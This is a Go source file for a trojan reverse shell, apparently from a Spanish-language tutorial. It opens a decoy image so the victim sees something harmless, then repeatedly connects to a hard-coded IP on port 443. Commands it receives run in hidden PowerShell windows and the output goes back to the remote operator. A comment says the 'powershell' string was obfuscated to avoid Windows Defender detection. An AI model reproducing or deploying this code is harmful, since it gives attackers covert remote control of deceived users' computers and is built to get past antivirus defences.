package main

import (
	"bufio"
	"fmt"
	"imagen/lib"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

var (
	ip   = "172.27.246.109"
	port = 443
)

func main() {
	ruta := os.Getenv("temp") + "\\imagen.jpg"
	os.WriteFile(ruta, lib.Bytes, 0644)
	exec.Command("explorer", ruta).Run()
	for {
		var (
			con net.Conn
			err error
		)
		for {
			//172.27.246.109:443
			con, err = net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
			if err != nil {
				time.Sleep(10 * time.Second)
				continue
			}
			break
		}

		for {
			pwd, err := os.Getwd()
			if err != nil {
				con.Write([]byte(fmt.Sprintf("%s\n", err)))
				continue
			}

			_, err = con.Write([]byte(fmt.Sprintf("PS %s> ", pwd)))
			if err != nil {
				break
			}

			msg, err := bufio.NewReader(con).ReadString('\n')
			if err != nil {
				con.Write([]byte(fmt.Sprintf("%s\n", err)))
				continue
			}

			msg = strings.TrimSuffix(msg, "\n")

			if strings.HasPrefix(msg, "cd") {
				//msg = msg[3:]
				msg = strings.TrimPrefix(msg, "cd ")
				err = os.Chdir(msg)
				if err != nil {
					con.Write([]byte(fmt.Sprintf("%s\n", err)))
					continue
				}
			} else {
				// Cambiado despues de la grabacion, para evitar deteccion del Windows Defender
				cmd := exec.Command(string([]byte{'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l'}), "-c", msg)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				salida, err := cmd.CombinedOutput()
				if err != nil {
					con.Write([]byte(err.Error()))
					continue
				}
				_, err = con.Write([]byte(fmt.Sprintf("%s\n", salida)))
				if err != nil {
					break
				}
			}
		}

	}
}
